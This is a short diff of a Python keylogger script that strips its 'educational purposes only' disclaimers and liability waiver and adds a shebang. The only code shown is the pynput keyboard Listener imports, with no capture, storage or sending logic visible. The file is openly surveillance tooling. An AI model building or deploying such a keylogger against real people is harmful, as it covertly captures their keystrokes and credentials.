@@ -1,7 +1,6 @@
-#This is a basic keylogger created with the help of Youtbe videos.  It is poorly written and most likely will not work.
-#If it does work, it will likely be detected and removed by antivirus immediatly.  
-#However, if does work, it is for EDUCATIONAL PURPOSES ONLY and should not be used for any malicious reason.
-#User assumes all responsibilty for the use of this code and any outcomes, hexs, curses, criminal charges, UN sanctions, bad luck or other misfortune that may result.
+#!/bin/python3
+#This is a basic keylogger created with the help of Youtbe videos.
+
 
 import pynput
 from pynput.keyboard import Key, Listener
